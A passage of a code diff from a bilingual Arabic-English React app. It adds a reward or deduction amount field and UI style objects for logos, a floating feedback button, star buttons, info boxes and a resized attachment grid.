+        <Field label={canManageAll && rewardRequestForm.actionType === "خصم" && rewardRequestForm.valueType === "percentage" ? (language === "ar" ? "النسبة %" : "Percentage %") : t.amount}><Input type="number" value={rewardRequestForm.amount} onChange={(e) => setRewardRequestForm((p) => ({ ...p, amount: e.target.value }))} /></Field>
         <Field label={t.reason}><Textarea value={rewardRequestForm.reason} onChange={(e) => setRewardRequestForm((p) => ({ ...p, reason: e.target.value }))} /></Field>
         <div style={{ ...ui.modalActions, ...(isMobileView ? ui.modalActionsMobile : {}) }}><Button onClick={submitRewardRequest}>{canManageAll ? t.rewardOrDeduction : t.requestReward}</Button></div>
       </Modal>
@@ -5489,6 +7952,18 @@ const ui = {
     color: "var(--text-soft)",
     lineHeight: 1.8,
   },
+  brandLogoAuth: {
+    width: 42,
+    height: 42,
+    objectFit: "contain",
+    filter: "drop-shadow(0 0 10px rgba(255, 0, 0, 0.35))",
+  },
+  brandLogoBadge: {
+    width: 18,
+    height: 18,
+    objectFit: "contain",
+    filter: "drop-shadow(0 0 6px rgba(255, 0, 0, 0.4))",
+  },
   phoneWrap: {
     width: 56,
     height: 56,
@@ -5532,6 +8007,39 @@ const ui = {
     gap: 10,
     flexWrap: "wrap",
     alignItems: "center",
+  },
+  feedbackFloatingButton: {
+    position: "fixed",
+    left: 18,
+    bottom: 18,
+    width: 52,
+    height: 52,
+    borderRadius: 999,
+    border: "1px solid rgba(245, 158, 11, 0.35)",
+    background: "linear-gradient(135deg, #f59e0b, #f97316)",
+    color: "#fff",
+    display: "flex",
+    alignItems: "center",
+    justifyContent: "center",
+    boxShadow: "0 14px 32px rgba(249, 115, 22, 0.28)",
+    cursor: "pointer",
+    zIndex: 1200,
+  },
+  feedbackStarButton: {
+    width: 52,
+    height: 52,
+    borderRadius: 14,
+    border: "1px solid var(--border)",
+    background: "var(--surface-soft)",
+    color: "#f59e0b",
+    display: "flex",
+    alignItems: "center",
+    justifyContent: "center",
+    cursor: "pointer",
+  },
+  feedbackStarButtonActive: {
+    background: "rgba(245, 158, 11, 0.14)",
+    borderColor: "rgba(245, 158, 11, 0.45)",
   },
   syncStatusDot: {
     position: "fixed",
@@ -5760,6 +8268,22 @@ const ui = {
     appearance: "auto",
     boxShadow: "inset 0 0 0 1px rgba(255,255,255,0.02)",
   },
+  infoBox: {
+    padding: "12px 14px",
+    borderRadius: 14,
+    border: "1px solid var(--border)",
+    background: "var(--surface-soft)",
+    color: "var(--text-soft)",
+    fontSize: 14,
+  },
+  emptyState: {
+    padding: "30px 16px",
+    borderRadius: 18,
+    border: "1px dashed var(--border)",
+    background: "var(--surface-soft)",
+    color: "var(--text-soft)",
+    fontSize: 16,
+  },
   textarea: {
     width: "100%",
     minHeight: 120,
@@ -5815,7 +8339,7 @@ const ui = {
     alignItems: "center",
     justifyContent: "center",
     padding: 16,
-    zIndex: 999,
+    zIndex: 10000,
   },
   modalBox: {
     width: "100%",
@@ -6927,9 +9451,9 @@ const ui = {
   infoRow: { display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px 18px", borderRadius: 18, background: "var(--surface-soft)", border: "1px solid var(--border)" },
   lockRow: { display: "flex", gap: 12, alignItems: "center", padding: "18px", borderRadius: 18, background: "var(--surface-soft)", border: "1px solid var(--border)" },
   lockSwitch: { minWidth: 56 },
-  attachGrid: { display: "grid", gridTemplateColumns: "repeat(4, minmax(0, 1fr))", gap: 16 },
-  attachOption: { display: "grid", justifyItems: "center", gap: 12, border: "none", background: "transparent", color: "var(--text)", cursor: "pointer", fontSize: 18 },
-  attachOptionIcon: { width: 88, height: 88, borderRadius: 999, background: "rgba(15,23,42,0.08)", display: "inline-flex", alignItems: "center", justifyContent: "center" },
+  attachGrid: { display: "grid", gridTemplateColumns: "repeat(4, minmax(0, 1fr))", gap: 10 },
+  attachOption: { display: "grid", justifyItems: "center", gap: 8, border: "none", background: "transparent", color: "var(--text)", cursor: "pointer", fontSize: 15 },
+  attachOptionIcon: { width: 54, height: 54, borderRadius: 999, background: "rgba(15,23,42,0.08)", display: "inline-flex", alignItems: "center", justifyContent: "center" },
 
   errorText: {
     color: "#dc2626",
